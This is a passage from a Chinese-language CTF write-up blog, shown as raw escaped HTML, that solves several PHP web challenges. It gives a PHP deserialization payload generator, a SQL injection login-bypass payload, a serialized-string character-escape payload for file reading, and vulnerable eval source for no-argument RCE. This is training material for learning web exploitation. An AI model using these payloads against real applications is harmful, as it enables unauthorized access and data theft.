class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;include&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;flag.php&amp;quot;&lt;/span&gt;);&lt;br&gt;&lt;br&gt;highlight_file(&lt;span class=&#34;hljs-keyword&#34;&gt;__FILE__&lt;/span&gt;);&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;FileHandler&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$op&lt;/span&gt;=&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$filename&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;flag.php&amp;#x27;&lt;/span&gt;;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$content&lt;/span&gt;;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$op&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$filename&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/tmp/tmpfile&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$content&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Hello World!&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;process();&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;process&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;op == &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;) &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;write();&lt;br&gt;        &amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;op == &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;2&amp;quot;&lt;/span&gt;) &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-variable&#34;&gt;$res&lt;/span&gt; = &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;read();&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;output(&lt;span class=&#34;hljs-variable&#34;&gt;$res&lt;/span&gt;);&lt;br&gt;        &amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;output(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Bad Hacker!&amp;quot;&lt;/span&gt;);&lt;br&gt;        &amp;#125;&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;write&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;filename) &amp;amp;&amp;amp; &lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;content)) &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(strlen((&lt;span class=&#34;hljs-keyword&#34;&gt;string&lt;/span&gt;)&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;content) &amp;gt; &lt;span class=&#34;hljs-number&#34;&gt;100&lt;/span&gt;) &amp;#123;&lt;br&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;output(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Too long!&amp;quot;&lt;/span&gt;);&lt;br&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;die&lt;/span&gt;();&lt;br&gt;            &amp;#125;&lt;br&gt;            &lt;span class=&#34;hljs-variable&#34;&gt;$res&lt;/span&gt; = file_put_contents(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;filename, &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;content);&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$res&lt;/span&gt;) &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;output(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Successful!&amp;quot;&lt;/span&gt;);&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;output(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Failed!&amp;quot;&lt;/span&gt;);&lt;br&gt;        &amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;output(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Failed!&amp;quot;&lt;/span&gt;);&lt;br&gt;        &amp;#125;&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;read&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$res&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;filename)) &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-variable&#34;&gt;$res&lt;/span&gt; = file_get_contents(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;filename);&lt;br&gt;        &amp;#125;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$res&lt;/span&gt;;&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;output&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$s&lt;/span&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[Result]: &amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$s&lt;/span&gt;;&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;__destruct&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;op === &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;2&amp;quot;&lt;/span&gt;)&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;op = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;content = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;process();&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$a&lt;/span&gt; = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; FileHandler;&lt;br&gt;var_dump(urlencode(serialize(&lt;span class=&#34;hljs-variable&#34;&gt;$a&lt;/span&gt;)));&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;gxyctf2019babysqli&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#gxyctf2019babysqli&#34;&gt;#&lt;/a&gt; [GXYCTF2019]BabySQli&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;测试单引号会报错&lt;/li&gt;
&lt;li&gt;union select 字段数为 3，但是没有回显点，可能是盲注或者报错注入&lt;/li&gt;
&lt;li&gt;user 为 admin 时报 wrong pass，user 为其它时报 wrong user，这里可能是盲注点&lt;/li&gt;
&lt;li&gt;有一段编码，base32+base64 解码得到： &lt;code&gt;select * from user where username = &#39;$name&#39;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;题目过滤了一些字符： &lt;code&gt;(    )   or    =&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;要通过注入拿到数据基本是不可行的，这里看到 sql 语句中只有查询 name 值，没有看到 password，可能判断是否登入的语句是 &lt;code&gt;(select * from user where username = &#39;$name&#39;)[&#39;password&#39;] =md5(password) &lt;/code&gt;&lt;/li&gt;
&lt;li&gt;此时构造 payload: &lt;code&gt;name=-1&#39; union select 1,&#39;admin&#39;,&#39;e10adc3949ba59abbe56e057f20f883e&#39;#&amp;amp;pw=123456&lt;/code&gt;  即可登陆成功拿到 flag&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;0ctf-2016piapiapia&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0ctf-2016piapiapia&#34;&gt;#&lt;/a&gt; [0CTF 2016]piapiapia&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;/www.zip 拿到源码&lt;/li&gt;
&lt;li&gt;看源码应该是反序列化的题目，同时看到 &lt;code&gt;return preg_replace($safe, &#39;hacker&#39;, $string);&lt;/code&gt; ，应该是字符逃逸反序列化的题目。同时 flag 应该在 config.php 中&lt;/li&gt;
&lt;li&gt;先构造 POP 链&lt;/li&gt;
&lt;li&gt;profile.php 可以读文件，要实现任意文件读取就要覆盖&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;msup&gt;&lt;mo stretchy=&#34;false&#34;&gt;[&lt;/mo&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;msup&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;mo stretchy=&#34;false&#34;&gt;]&lt;/mo&gt;&lt;mtext&gt;，而&lt;/mtext&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;profile[&amp;#x27;photo&amp;#x27;]，而&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.001892em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;，&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;而&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt; profile [‘photo’] 在 update.php 中控制。接下来就是要如何把 $profile [‘photo’] 变成 config.php&lt;/li&gt;
&lt;li&gt;update.php 可传入四个参数，其中 phone 和 email 被正则匹配限制，而 nickname 是用 strlen 限制在 10 以内，把 nickname 改成数组也就绕过了长度限制&lt;/li&gt;
&lt;li&gt;我们需要构造 &lt;code&gt;a:4:&amp;#123;s:5:&amp;quot;phone&amp;quot;;s:11:&amp;quot;12345678901&amp;quot;;s:5:&amp;quot;email&amp;quot;;s:10:&amp;quot;123@qq.com&amp;quot;;s:8:&amp;quot;nickname&amp;quot;;s:9:&amp;quot;lalalalla&amp;quot;;s:5:&amp;quot;photo&amp;quot;;s:10:&amp;quot;config.php&amp;quot;;&amp;#125;&lt;/code&gt; ，利用 where 会被替换成 hacker，构造 payload： &lt;code&gt;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&amp;quot;;&amp;#125;s:5:&amp;quot;photo&amp;quot;;s:10:&amp;quot;config.php&amp;quot;;&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;要注意这边构造时，需要把 nickname 构造成数组&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;gxyctf2019禁止套娃&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#gxyctf2019禁止套娃&#34;&gt;#&lt;/a&gt; [GXYCTF2019] 禁止套娃&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;测试发现有 /.git/ 用 githack 跑一下，但是我没拿到源码？？&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;网上找到源码：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;flag.php&amp;quot;&lt;/span&gt;;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;flag在哪里呢？ &amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;exp&amp;#x27;&lt;/span&gt;]))&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (!preg_match(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;exp&amp;#x27;&lt;/span&gt;])) &amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;;&amp;#x27;&lt;/span&gt; === preg_replace(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;/[a-z,_]+\((?R)?\)/&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;exp&amp;#x27;&lt;/span&gt;])) &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (!preg_match(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;exp&amp;#x27;&lt;/span&gt;])) &amp;#123;&lt;br&gt;                &lt;span class=&#34;hljs-comment&#34;&gt;// echo $_GET[&amp;#x27;exp&amp;#x27;];&lt;/span&gt;&lt;br&gt;                @&lt;span class=&#34;hljs-keyword&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;exp&amp;#x27;&lt;/span&gt;]);&lt;br&gt;            &amp;#125;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;br&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;还差一点哦！&amp;quot;&lt;/span&gt;);&lt;br&gt;            &amp;#125;&lt;br&gt;        &amp;#125;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;再好好想想！&amp;quot;&lt;/span&gt;);&lt;br&gt;        &amp;#125;&lt;br&gt;    &amp;#125;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;还想读flag，臭弟弟！&amp;quot;&lt;/span&gt;);&lt;br&gt;    &amp;#125;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// highlight_file(__FILE__);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;无参数 RCE（&lt;a href=&#34;https://xz.aliyun.com/t/6316%EF%BC%89&#34;&gt;https://xz.aliyun.com/t/6316）&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;一些常见函数：&lt;/p&gt;
&lt;figure class=&#34;highlight stylus&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs stylus&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;getchwd&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt; 函数返回当前工作目录。&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;scandir&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt; 函数返回指定目录中的文件和目录的数组。&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;dirname&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt; 函数返回路径中的目录部分。&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;chdir&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt; 函数改变当前的目录。&lt;br&gt;&lt;br&gt;&lt;span 